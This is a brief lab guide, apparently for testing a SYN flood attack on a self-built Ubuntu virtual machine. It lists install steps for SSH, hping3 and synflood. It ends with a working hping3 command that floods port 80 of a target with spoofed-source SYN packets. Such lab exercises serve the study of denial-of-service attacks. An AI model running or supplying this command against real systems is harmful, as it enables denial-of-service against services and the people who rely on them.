#TEST FOR SYN FLOOD ATTACK

##Requirements

SSH Server
Hping3
Synflood
Ubuntu virtual machine

##GUIDE

Create a container on any server where you have permissions.

In this container, it creates a virtual machine of Ubuntu in current versions.

Access this VM using the command user@ip_direction (you must create a user other than root and the IP address must be that of the virtual machine).

You can use the login.php file to check that you have a connection to the IP address of the virtual machine. To do this you must have apache2 php installed on the machine.

In the virtual machine install SSH, Hping3, and SYNFlood

SSH -> sudo apt-get install OpenSSH-server
Hping3 -> sudo apt-get install hping3
Synflood -> sudo apt-get install synflood

Finally, with all the tools installed, use the following command to execute the attack

sudo hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source @ip_direction_objetive

Note: You must force the virtual machine to close because this attack prevents you from using the virtual machine
